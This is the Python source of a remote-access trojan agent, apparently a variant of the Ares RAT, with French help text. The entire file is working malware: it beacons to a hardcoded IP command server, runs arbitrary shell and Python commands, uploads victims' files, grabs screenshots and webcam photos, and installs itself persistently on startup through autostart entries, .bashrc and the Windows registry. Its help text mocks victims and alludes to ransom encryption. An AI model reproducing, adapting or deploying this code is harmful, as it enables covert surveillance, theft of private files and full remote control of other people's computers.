# -*- coding: utf-8 -*-
import requests
import time
import os
import subprocess
import platform
import shutil
import sys
import traceback
import threading
import uuid
import io
import zipfile
import tempfile
import socket
import getpass
import cv2
import hashlib
import string
import random
import numpy as np
from PIL import Image
import base64
if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

# Configuration
SERVER = "https://82.64.91.111:5731"
HELLO_INTERVAL = 5
IDLE_TIME = 300
MAX_FAILED_CONNECTIONS = 10
PERSIST = True

HELP = """
<any shell command>
Execute des comandes cmd classique.

upload <local_file>
recupere un fichier et l'envoie sur le serveur.

download <url> <destination>
telecharge un fichier en HTTP(S).

zip <archive_name> <folder>
Zip un fichier

screenshot
Pour verifier qu'il fait bien les devoirs

webcam
Souriez vous etes filmé ;)

encrypt
Le genre de mst qu'on veut eviter

decrypt
j'espere qu'il a payé le con

python <command|file>
Lance un script ou un code python

persist
Permet de le rendre plus collant qu'une ex toxique.

clean
Quel erreur champion

exit
T'es sur ? pas de retour en arriere possible champion
"""

def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args, kwargs=kwargs)
        t.start()
        return
    return wrapper

class Agent(object):

    def __init__(self):
        self.idle = True
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        
        
    def get_install_dir(self):
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.ares')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
        if os.path.exists(install_dir):
            return install_dir
        else:
            return None

    def is_installed(self):
        return self.get_install_dir()

    def get_consecutive_failed_connections(self):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            if os.path.exists(check_file):
                with open(check_file, "r") as f:
                    return int(f.read())
            else:
                return 0
        else:
            return self.failed_connections

    def update_consecutive_failed_connections(self, value):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            with open(check_file, "w") as f:
                f.write(str(value))
        else:
            self.failed_connections = value

    def log(self, to_log):
        """ Write data to agent log """
        print(to_log)

    def get_UID(self):
        """ Returns a unique ID for the agent """
        return getpass.getuser() + "_" + str(uuid.getnode())

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(SERVER + '/api/' + self.uid + '/hello',
            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username}, verify=False)
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if self.silent:
            self.log(output)
            return
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(SERVER + '/api/' + self.uid + '/report', 
        data={'output': output}, verify=False)

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    @threaded
    def webcam(self):
        """ Takes a photo from the webcam and uploads it to the server"""
        try:
            # Open the default camera (usually the built-in webcam)
            cap = cv2.VideoCapture(0)

            # Check if the camera is opened successfully
            if not cap.isOpened():
                raise Exception("Could not open the camera. Check if the camera is available and not in use.")

            # Read a frame from the camera
            ret, frame = cap.read()

            # Release the camera
            cap.release()

            # Check if the frame was read successfully
            if not ret:
                raise Exception("Could not read a frame from the camera. Make sure the camera is working correctly.")

            # Convert the frame to an image format that can be saved by PIL
            image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))

            # Use tempfile.mkstemp to create a temporary file
            _, screenshot_file = tempfile.mkstemp(suffix=".png")

            # Save the image
            image.save(screenshot_file)

            # Upload the image to the server
            self.upload(screenshot_file)

            # Remove the temporary file
            os.remove(screenshot_file)
        except Exception as exc:
            self.send_output(traceback.format_exc())
            self.send_output("Error in webcam: {}".format(str(exc)))
            
            
    @threaded
    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err).decode('utf-8')
            self.send_output(output)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def python(self, command_or_file):
        """ Runs a python command or a python file and returns the output """
        new_stdout = io.StringIO()
        old_stdout = sys.stdout
        sys.stdout = new_stdout
        new_stderr = io.StringIO()
        old_stderr = sys.stderr
        sys.stderr = new_stderr
        if os.path.exists(command_or_file):
            self.send_output("[*] Running python file...")
            with open(command_or_file, 'r') as f:
                python_code = f.read()
                try:
                    exec(python_code)
                except Exception as exc:
                    self.send_output(traceback.format_exc())
        else:
            self.send_output("[*] Running python command...")
            try:
                exec(command_or_file)
            except Exception as exc:
                self.send_output(traceback.format_exc())
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())

    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))

    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(SERVER + '/api/' + self.uid + '/upload',
                    files={'uploaded': open(file, 'rb')}, verify=False)
            else:
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def download(self, file, destination=''):
        """ Downloads a file the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def persist(self):
        """ Installs the agent """
        if not getattr(sys, 'frozen', False):
            self.send_output('[!] Persistence only supported on compiled agents.')
            return
        if self.is_installed():
            self.send_output('[!] Agent seems to be already installed.')
            return
        if platform.system() == 'Linux':
            persist_dir = os.path.join(os.path.expanduser('~'), '.ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)

            # Adding agent to autostart
            autostart_dir = os.path.expanduser("~/.config/autostart/")
            if os.path.exists(autostart_dir):
                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
                with open(os.path.join(autostart_dir, 'ares.desktop'), 'w') as f:
                    f.write(desktop_entry)

            # Adding agent to bashrc for continuous running
            bashrc_path = os.path.expanduser('~/.bashrc')
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'a') as f:
                    f.write('\n# Ares\n%s &' % agent_path)

        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('APPDATA'), 'Ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)

            # Adding agent to startup folder for auto-run
            startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            with open(os.path.join(startup, 'ares.lnk'), 'w') as f:
                f.write(agent_path)

            # Adding agent to registry for auto-run
            registry_cmd = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Ares /t REG_SZ /d "%s" /f' % agent_path
            os.system(registry_cmd)

        self.send_output('[+] Agent installed to: %s' % persist_dir)


    def clean(self):
        """ Uninstalls the agent """
        if not self.is_installed():
            self.send_output('[!] Agent is not installed.')
            return
        install_dir = self.get_install_dir()
        if platform.system() == 'Linux':
            shutil.rmtree(install_dir)
            autostart_path = self.expand_path('~/.config/autostart/ares.desktop')
            if os.path.exists(autostart_path):
                os.remove(autostart_path)
            bashrc_path = self.expand_path('~/.bashrc')
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    lines = f.readlines()
                with open(bashrc_path, 'w') as f:
                    for line in lines:
                        if "ares" not in line:
                            f.write(line)
        elif platform.system() == 'Windows':
            shutil.rmtree(install_dir)
            startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            ares_lnk = os.path.join(startup, 'ares.lnk')
            if os.path.exists(ares_lnk):
                os.remove(ares_lnk)
        self.send_output('[+] Agent uninstalled from: %s' % install_dir)

    def idle_time(self):
        """ Get the system idle time in seconds """
        if platform.system() == 'Linux':
            with open('/proc/uptime', 'r') as f:
                return float(f.readline().split()[0])
        elif platform.system() == 'Windows':
            return float(subprocess.check_output('powershell -command "Add-Type \'[DllImport(\\"user32.dll\\")]public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);public struct LASTINPUTINFO{public uint cbSize;public uint dwTime;}\' -Name \'Win32\' -Namespace \'Win32\' -PassThru; $lastInputInfo = New-Object Win32.LASTINPUTINFO; $lastInputInfo.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($lastInputInfo); [Win32]::GetLastInputInfo([ref]$lastInputInfo); $milliseconds = (Get-Date).Ticks/10000 - $lastInputInfo.dwTime; $milliseconds/1000"', shell=True))
        return 0

    def loop(self):
        """ Main agent loop """
        while True:
            try:
                if (time.time() - self.last_active) > IDLE_TIME:
                    self.idle = True
                instructions = self.server_hello()
                self.update_consecutive_failed_connections(0)
                if instructions:
                    self.idle = False
                    self.last_active = time.time()
                    instructions = instructions.splitlines()
                    for cmd in instructions:
                        if not cmd.strip():
                            continue
                        self.send_output("$ %s" % cmd, False)
                        if cmd.startswith('cd '):
                            try:
                                self.cd(cmd.split(' ', 1)[1])
                            except Exception as exc:
                                self.send_output('[!] %s' % str(exc))
                        elif cmd.startswith('download '):
                            cmd = cmd.split(' ')
                            try:
                                self.download(cmd[1], cmd[2])
                            except:
                                self.download(cmd[1])
                        elif cmd.startswith('upload '):
                            self.upload(cmd.split(' ', 1)[1])
                        elif cmd.startswith('python '):
                            self.python(cmd.split(' ', 1)[1])
                        elif cmd == 'screenshot':
                            self.screenshot()
                        elif cmd == 'webcam':
                            self.webcam()
                        elif cmd == 'persist':
                            self.persist()
                        elif cmd == 'clean':
                            self.clean()
                        elif cmd == 'exit':
                            self.send_output('[*] Bye!')
                            os._exit(0)
                        elif cmd == 'help':
                            self.send_output(HELP)
                        else:
                            self.runcmd(cmd)
                time.sleep(HELLO_INTERVAL)
            except Exception as exc:
                self.update_consecutive_failed_connections(self.get_consecutive_failed_connections() + 1)
                self.log(traceback.format_exc())
                self.log("[!] Server seems to be down. Consecutive failed connections: %d" % self.get_consecutive_failed_connections())
                if self.get_consecutive_failed_connections() > MAX_FAILED_CONNECTIONS:
                    self.send_output("[!] Too many failed connections. Exiting...")
                    break
                time.sleep(HELLO_INTERVAL)

    @threaded
    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        screenshot = ImageGrab.grab()
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        tmp_file.close()
        screenshot.save(screenshot_file)
        self.upload(screenshot_file)

    def run(self):
        """ Run the agent """
        try:
            self.send_output("[*] Agent started.")
            if self.is_installed():
                self.send_output("[+] Agent installed on: %s" % self.get_install_dir())
            self.loop()
        except KeyboardInterrupt:
            self.send_output("[*] Exiting...")
            os._exit(0)
        except Exception as exc:
            self.send_output("[!] Fatal error: %s" % str(exc))
            os._exit(1)

if __name__ == '__main__':
    agent = Agent()
    agent.persist()
    agent.run()
